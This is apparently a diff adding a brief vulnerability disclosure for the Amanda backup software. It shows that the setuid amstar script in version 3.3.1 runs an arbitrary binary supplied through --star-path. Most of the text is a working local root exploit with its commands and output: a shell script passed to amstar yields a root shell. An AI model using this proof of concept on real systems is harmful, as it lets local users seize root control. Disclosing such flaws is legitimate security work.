@@ -1,0 +1,29 @@
+AMANDA, the Advanced Maryland Automatic Network Disk Archiver, is a backup 
+solution that allows the IT administrator to set up a single master backup
+server to back up multiple hosts over network to tape drives/changers or 
+disks or optical media. Amanda uses native utilities and formats (e.g. dump
+and/or GNU tar) and can back up a large number of servers and workstations
+running multiple versions of Linux or Unix. 
+
+A user with backup privs can trivially compromise a client installation.
+Amstar is an Amanda Application API script. It should not be run by users 
+directly. It uses star to backup and restore data. It runs binaries with
+root permissions when parsing the command line arguement --star-path. 
+
+Tested against Amanda 3.3.1. An example is shown below:
+
+$ id
+uid=34(backup) gid=34(backup) groups=34(backup),6(disk),26(tape)
+$ cat /tmp/runme.sh
+#!/bin/sh
+/bin/sh
+$ ls -al /usr/lib/amanda/application/amstar
+-rwsr-xr-- 1 root backup 31284 Jul 29  2012 /usr/lib/amanda/application/amstar
+$ /usr/lib/amanda/application/amstar restore --star-path=/tmp/runme.sh
+# id
+uid=0(root) gid=34(backup) groups=0(root),6(disk),26(tape),34(backup)
+# uname -a
+Linux raspberrypi 3.10.25 #1 Sat Dec 28 20:50:23 EST 2013 armv6l GNU/Linux
+#
+
+ -- Hacker Fantastic
